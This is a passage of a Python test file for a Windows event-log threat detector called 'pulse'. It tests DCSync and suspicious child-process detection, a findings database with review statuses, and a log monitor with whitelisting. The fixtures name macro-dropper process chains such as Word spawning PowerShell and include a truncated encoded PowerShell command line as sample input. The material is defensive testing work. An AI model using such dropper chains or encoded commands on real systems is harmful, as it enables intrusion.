    """The detector must not false-positive on any other event ID."""
    other = {
        "event_id": 4624,
        "timestamp": "2026-04-15T10:00:00",
        "data": (
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            "<System><EventID>4624</EventID></System><EventData></EventData></Event>"
        ),
    }
    assert detect_dcsync([other]) == []


# =============================================================================
# Suspicious child process detection tests
# =============================================================================

def _make_4688_event(parent, child, user="alice", command_line="",
                     timestamp="2026-04-15T10:00:00.000000Z"):
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System><EventID>4688</EventID>"
        f'<TimeCreated SystemTime="{timestamp}" /></System>'
        "<EventData>"
        f'<Data Name="SubjectUserName">{user}</Data>'
        f'<Data Name="ParentProcessName">{parent}</Data>'
        f'<Data Name="NewProcessName">{child}</Data>'
        f'<Data Name="CommandLine">{command_line}</Data>'
        "</EventData></Event>"
    )
    return {"event_id": 4688, "timestamp": timestamp, "data": xml}


def test_child_process_flags_word_spawning_powershell():
    """Word → PowerShell is the classic macro dropper pattern."""
    events = [_make_4688_event(
        r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )]
    findings = detect_suspicious_child_process(events)
    assert len(findings) == 1
    assert findings[0]["rule"] == "Suspicious Child Process"
    assert findings[0]["severity"] == "HIGH"
    assert "winword.exe" in findings[0]["details"].lower()
    assert "powershell.exe" in findings[0]["details"].lower()


def test_child_process_flags_browser_spawning_cmd():
    """Chrome → cmd.exe is a copy-paste social-engineering pattern."""
    events = [_make_4688_event(
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Windows\System32\cmd.exe",
    )]
    findings = detect_suspicious_child_process(events)
    assert len(findings) == 1


def test_child_process_flags_outlook_spawning_wscript():
    """Outlook → wscript.exe is a classic attachment-based dropper."""
    events = [_make_4688_event(
        r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
        r"C:\Windows\System32\wscript.exe",
    )]
    assert len(detect_suspicious_child_process(events)) == 1


def test_child_process_ignores_normal_chains():
    """explorer.exe spawning cmd.exe is perfectly normal."""
    events = [_make_4688_event(
        r"C:\Windows\explorer.exe",
        r"C:\Windows\System32\cmd.exe",
    )]
    assert detect_suspicious_child_process(events) == []


def test_child_process_ignores_office_spawning_benign_child():
    """Word → splwow64.exe is normal printing — don't flag."""
    events = [_make_4688_event(
        r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        r"C:\Windows\splwow64.exe",
    )]
    assert detect_suspicious_child_process(events) == []


def test_child_process_includes_command_line_when_present():
    """If command-line auditing is on, the snippet should surface in details."""
    events = [_make_4688_event(
        r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell -enc JABz...",
    )]
    details = detect_suspicious_child_process(events)[0]["details"]
    assert "powershell -enc JABz" in details


def test_child_process_truncates_long_command_lines():
    """Obfuscated PS lines can be KB long — truncate to keep the UI readable."""
    long_cmd = "powershell " + "A" * 500
    events = [_make_4688_event(
        r"C:\...\WINWORD.EXE", r"C:\...\powershell.exe", command_line=long_cmd,
    )]
    details = detect_suspicious_child_process(events)[0]["details"]
    # 200-char cap + ellipsis marker
    assert "..." in details
    assert "A" * 500 not in details


def test_child_process_ignores_non_4688_events():
    other = {
        "event_id": 4624,
        "timestamp": "2026-04-15T10:00:00",
        "data": (
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            "<System><EventID>4624</EventID></System><EventData></EventData></Event>"
        ),
    }
    assert detect_suspicious_child_process([other]) == []


# =============================================================================
# Database tests
# =============================================================================
from pulse.database import init_db, save_scan, get_history, get_scan_findings


def test_init_db_creates_tables(tmp_path):
    """init_db should create the scans and findings tables."""
    import sqlite3
    db = str(tmp_path / "pulse.db")
    init_db(db)
    conn = sqlite3.connect(db)
    tables = {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()}
    conn.close()
    assert "scans"    in tables
    assert "findings" in tables


def test_init_db_is_idempotent(tmp_path):
    """Calling init_db twice should not raise an error or reset data."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    init_db(db)   # second call should be safe


def test_save_scan_returns_scan_id(tmp_path):
    """save_scan should return an integer scan ID."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    scan_id = save_scan(db, [])
    assert isinstance(scan_id, int)
    assert scan_id >= 1


def test_save_scan_stores_findings(tmp_path):
    """save_scan should persist all findings to the findings table."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    findings = [
        {"severity": "HIGH",   "rule": "Brute Force Login Attempt",
         "event_id": 4625, "timestamp": "2026-04-08T09:14:22",
         "mitre": "T1110", "description": "10 failed logins", "details": "..."},
        {"severity": "MEDIUM", "rule": "Scheduled Task Created",
         "event_id": 4698, "timestamp": "2026-04-08T09:22:47",
         "mitre": "T1053.005", "description": "New task", "details": "..."},
    ]
    scan_id = save_scan(db, findings)
    stored = get_scan_findings(db, scan_id)
    assert len(stored) == 2
    rules = {f["rule"] for f in stored}
    assert "Brute Force Login Attempt" in rules
    assert "Scheduled Task Created"    in rules


def test_save_scan_stores_metadata(tmp_path):
    """save_scan should persist scan metadata (score, label, stats)."""
    import sqlite3
    db = str(tmp_path / "pulse.db")
    init_db(db)
    stats = {"files_scanned": 2, "total_events": 500}
    scan_id = save_scan(db, [], scan_stats=stats, score=72, score_label="MODERATE")
    conn = sqlite3.connect(db)
    row = conn.execute("SELECT files_scanned, total_events, score, score_label FROM scans WHERE id=?",
                       (scan_id,)).fetchone()
    conn.close()
    assert row[0] == 2
    assert row[1] == 500
    assert row[2] == 72
    assert row[3] == "MODERATE"


def test_get_history_returns_scans(tmp_path):
    """get_history should return saved scans newest first."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    save_scan(db, [], score=80, score_label="GOOD")
    save_scan(db, [], score=60, score_label="MODERATE")
    history = get_history(db)
    assert len(history) == 2
    # newest first — second save should be id=2
    assert history[0]["id"] == 2
    assert history[1]["id"] == 1


def test_get_history_empty_returns_empty_list(tmp_path):
    """get_history on an empty database should return an empty list."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    assert get_history(db) == []


def test_get_history_missing_db_returns_empty_list(tmp_path):
    """get_history on a non-existent path should return [] not raise."""
    db = str(tmp_path / "does_not_exist.db")
    assert get_history(db) == []


def test_get_history_respects_limit(tmp_path):
    """get_history should return at most `limit` scans."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    for _ in range(5):
        save_scan(db, [])
    assert len(get_history(db, limit=3)) == 3


def test_save_multiple_scans_have_separate_findings(tmp_path):
    """Findings from two different scans should not mix."""
    db = str(tmp_path / "pulse.db")
    init_db(db)

    findings_a = [{"severity": "HIGH", "rule": "Rule A", "event_id": 4625,
                   "timestamp": "2026-04-08T09:00:00", "mitre": "-",
                   "description": "desc", "details": "details"}]
    findings_b = [{"severity": "LOW",  "rule": "Rule B", "event_id": 4624,
                   "timestamp": "2026-04-08T10:00:00", "mitre": "-",
                   "description": "desc", "details": "details"},
                  {"severity": "LOW",  "rule": "Rule C", "event_id": 4624,
                   "timestamp": "2026-04-08T10:01:00", "mitre": "-",
                   "description": "desc", "details": "details"}]

    id_a = save_scan(db, findings_a)
    id_b = save_scan(db, findings_b)

    assert len(get_scan_findings(db, id_a)) == 1
    assert len(get_scan_findings(db, id_b)) == 2


def test_get_scan_findings_sorted_by_severity(tmp_path):
    """get_scan_findings should return findings sorted CRITICAL first."""
    db = str(tmp_path / "pulse.db")
    init_db(db)
    findings = [
        {"severity": "LOW",      "rule": "Low Rule",      "event_id": 4624,
         "timestamp": "-", "mitre": "-", "description": "-", "details": "-"},
        {"severity": "CRITICAL", "rule": "Critical Rule",  "event_id": 4625,
         "timestamp": "-", "mitre": "-", "description": "-", "details": "-"},
    ]
    scan_id = save_scan(db, findings)
    stored = get_scan_findings(db, scan_id)
    assert stored[0]["severity"] == "CRITICAL"
    assert stored[1]["severity"] == "LOW"


# ---------------------------------------------------------------------------
# Finding review status
# ---------------------------------------------------------------------------
from pulse.database import set_finding_review, REVIEW_STATUSES


def _seed_one_finding(tmp_path):
    db = str(tmp_path / "pulse.db")
    init_db(db)
    save_scan(db, [{
        "severity": "HIGH", "rule": "Brute Force Attempt", "event_id": 4625,
        "timestamp": "2026-04-15T10:00:00", "mitre": "T1110",
        "description": "desc", "details": "5 failed logins for alice",
    }])
    row = get_scan_findings(db, 1)[0]
    return db, row["id"]


def test_findings_default_review_status_is_new(tmp_path):
    """A freshly saved finding should start with review_status='new'."""
    db, fid = _seed_one_finding(tmp_path)
    row = get_scan_findings(db, 1)[0]
    assert row["review_status"] == "new"
    assert row["review_note"] is None
    assert row["reviewed_at"] is None


def test_set_finding_review_marks_reviewed(tmp_path):
    db, fid = _seed_one_finding(tmp_path)
    updated = set_finding_review(db, fid, "reviewed", note="looked at it, benign")
    assert updated["review_status"] == "reviewed"
    assert updated["review_note"]   == "looked at it, benign"
    assert updated["reviewed_at"]   is not None


def test_set_finding_review_false_positive_persists(tmp_path):
    db, fid = _seed_one_finding(tmp_path)
    set_finding_review(db, fid, "false_positive", note="known scanner")
    row = get_scan_findings(db, 1)[0]
    assert row["review_status"] == "false_positive"
    assert row["review_note"]   == "known scanner"


def test_set_finding_review_resets_clears_timestamp(tmp_path):
    db, fid = _seed_one_finding(tmp_path)
    set_finding_review(db, fid, "reviewed", note="x")
    reset = set_finding_review(db, fid, "new", note="")
    assert reset["review_status"] == "new"
    assert reset["reviewed_at"]   is None
    assert reset["review_note"]   is None  # blank note is normalised to None


def test_set_finding_review_unknown_status_raises(tmp_path):
    import pytest
    db, fid = _seed_one_finding(tmp_path)
    with pytest.raises(ValueError):
        set_finding_review(db, fid, "bogus")


def test_set_finding_review_unknown_id_returns_none(tmp_path):
    db = str(tmp_path / "pulse.db")
    init_db(db)
    assert set_finding_review(db, 999, "reviewed") is None


def test_review_statuses_tuple_shape():
    """REVIEW_STATUSES is the single source of truth consumed by the API.
    Freeze the shape so the dashboard and API stay in sync."""
    assert set(REVIEW_STATUSES) == {"new", "reviewed", "false_positive"}


# =============================================================================
# Monitor tests
# =============================================================================
from unittest.mock import patch
from pulse.monitor import poll_new_events, print_finding, _apply_whitelist


def _fake_event(record_num, event_id=4625):
    return {
        "event_id":   event_id,
        "timestamp":  "2026-04-09T10:00:00",
        "data":       "<Event/>",
        "record_num": record_num,
    }


def test_poll_new_events_returns_only_unseen(tmp_path):
    """poll_new_events should skip events whose keys are already in seen_keys."""
    events = [_fake_event(1), _fake_event(2), _fake_event(3)]
    seen   = {("Security.evtx", 1), ("Security.evtx", 2)}

    with patch("pulse.monitor._get_log_files", return_value=["Security.evtx"]):
        with patch("pulse.monitor.parse_evtx", return_value=events):
            result = poll_new_events(str(tmp_path), seen)

    assert len(result) == 1
    assert result[0]["record_num"] == 3


def test_poll_new_events_updates_seen_keys(tmp_path):
    """poll_new_events should add newly seen keys to seen_keys."""
    events = [_fake_event(10), _fake_event(11)]
    seen   = set()

    with patch("pulse.monitor._get_log_files", return_value=["Security.evtx"]):
        with patch("pulse.monitor.parse_evtx", return_value=events):
            poll_new_events(str(tmp_path), seen)

    assert ("Security.evtx", 10) in seen
    assert ("Security.evtx", 11) in seen


def test_poll_new_events_empty_folder(tmp_path):
    """poll_new_events returns an empty list when there are no log files."""
    seen = set()
    with patch("pulse.monitor._get_log_files", return_value=[]):
        result = poll_new_events(str(tmp_path), seen)
    assert result == []


def test_poll_new_events_all_already_seen(tmp_path):
    """poll_new_events returns nothing if all events were already processed."""
    events = [_fake_event(1), _fake_event(2)]
    seen   = {("Security.evtx", 1), ("Security.evtx", 2)}

    with patch("pulse.monitor._get_log_files", return_value=["Security.evtx"]):
        with patch("pulse.monitor.parse_evtx", return_value=events):
            result = poll_new_events(str(tmp_path), seen)

    assert result == []


def test_poll_new_events_multiple_files(tmp_path):
    """poll_new_events should deduplicate per filename, not globally."""
    # Both files have a record_num=1, but they are different files so both are new.
    events_a = [_fake_event(1)]
    events_b = [_fake_event(1)]
    seen     = set()

    def fake_parse(path):
        if "Security" in path:
            return events_a
        return events_b

    with patch("pulse.monitor._get_log_files", return_value=["Security.evtx", "System.evtx"]):
        with patch("pulse.monitor.parse_evtx", side_effect=fake_parse):
            result = poll_new_events(str(tmp_path), seen)

    assert len(result) == 2


def test_print_finding_outputs_rule_name(capsys):
    """print_finding should print the rule name to stdout."""
    finding = {
        "severity":    "HIGH",
        "rule":        "Brute Force Login Attempt",
        "description": "10 failed logins for account: admin",
        "timestamp":   "2026-04-09T10:00:00",
        "event_id":    4625,
        "mitre":       "T1110",
        "details":     "details here",
    }
    print_finding(finding)
    captured = capsys.readouterr()
    assert "Brute Force Login Attempt" in captured.out
    assert "HIGH" in captured.out


def test_print_finding_outputs_description(capsys):
    """print_finding should include the description line."""
    finding = {
        "severity":    "MEDIUM",
        "rule":        "Scheduled Task Created",
        "description": "New task: MalwareTask",
        "timestamp":   "-",
        "event_id":    4698,
        "mitre":       "T1053.005",
        "details":     "",
    }
    print_finding(finding)
    captured = capsys.readouterr()
    assert "New task: MalwareTask" in captured.out


def test_apply_whitelist_suppresses_rules():
    """_apply_whitelist should remove findings whose rule is whitelisted."""
    findings = [
        {"rule": "RDP Logon Detected",       "severity": "LOW",  "details": ""},
        {"rule": "Brute Force Login Attempt", "severity": "HIGH", "details": ""},
    ]
    whitelist = {"rules": ["RDP Logon Detected"], "accounts": [], "services": [], "ips": []}
    result = _apply_whitelist(findings, whitelist)
    assert len(result) == 1
    assert result[0]["rule"] == "Brute Force Login Attempt"


def test_apply_whitelist_suppresses_accounts():
    """_apply_whitelist should remove findings mentioning a whitelisted account."""
    findings = [
        {"rule": "Brute Force Login Attempt", "severity": "HIGH",
         "details": "account: svc_backup failed 10 times"},
        {"rule": "Brute Force Login Attempt", "severity": "HIGH",
         "details": "account: attacker failed 10 times"},
    ]
    whitelist = {"rules": [], "accounts": ["svc_backup"], "services": [], "ips": []}
    result = _apply_whitelist(findings, whitelist)
    assert len(result) == 1
    assert "attacker" in result[0]["details"]


def test_apply_whitelist_empty_does_nothing():
    """_apply_whitelist with empty lists should return findings unchanged."""
    findings = [{"rule": "Any Rule", "severity": "HIGH", "details": "something"}]
    result = _apply_whitelist(findings, {})
    assert len(result) == 1
